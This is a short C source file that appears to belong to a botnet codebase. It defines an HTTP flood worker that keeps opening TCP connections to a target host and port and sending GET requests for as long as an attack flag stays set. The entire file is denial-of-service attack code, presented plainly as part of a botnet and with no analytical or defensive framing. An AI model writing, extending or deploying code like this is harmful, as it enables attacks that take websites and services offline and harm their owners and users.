#include "../../include/botnet.h"
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

void *http_flood_worker(void *args) {
    struct target *target = (struct target *)args;
    int sock;
    struct sockaddr_in dest_addr;
    char request[] = "GET / HTTP/1.1\r\nHost: localhost\r\nUser-Agent: Mozilla/5.0\r\n\r\n";

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = target->port;
    dest_addr.sin_addr.s_addr = target->addr;

    while (attack_running) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            continue;
        }

        if (connect(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) >= 0) {
            send(sock, request, strlen(request), 0);
        }

        close(sock);
    }

    return NULL;
}
